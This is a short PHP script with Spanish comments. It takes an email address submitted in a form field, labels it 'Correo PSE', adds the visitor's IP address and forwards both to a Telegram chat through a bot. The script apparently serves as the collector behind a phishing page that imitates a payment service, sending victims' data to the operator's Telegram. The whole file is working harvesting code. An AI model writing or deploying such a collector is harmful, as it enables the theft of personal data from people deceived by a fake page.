<?php
// Incluir archivo de configuración
$config = include '../config.php'; // Ajusta la ruta según la ubicación de config.php

// Obtener las credenciales desde config.php
$botToken = $config['botToken'];
$chatId = $config['chatId'];

// Verifica si se recibió el correo electrónico
if (isset($_POST['PNEMail'])) {
    $email = $_POST['PNEMail'];

    // Captura la IP del usuario
    $userIp = $_SERVER['REMOTE_ADDR'];
    if ($userIp == '::1') {
        $userIp = '127.0.0.1 (Localhost)';
    }

    // Mensaje a enviar a Telegram
    $message = "Correo PSE: " . $email . "\n";
    $message .= "IP del usuario: " . $userIp;

    // URL para enviar mensajes a través de la API de Telegram
    $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";

    // Configura los datos para la solicitud POST
    $postData = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    // Configuración de cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Ejecuta la solicitud cURL
    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    // Verifica si hubo algún error
    if ($response === false) {
        echo "Error al enviar el mensaje: " . $error;
    } else {
        echo "Mensaje enviado correctamente a Telegram.";
    }
} else {
    echo "No se recibió ningún correo electrónico.";
}
?>
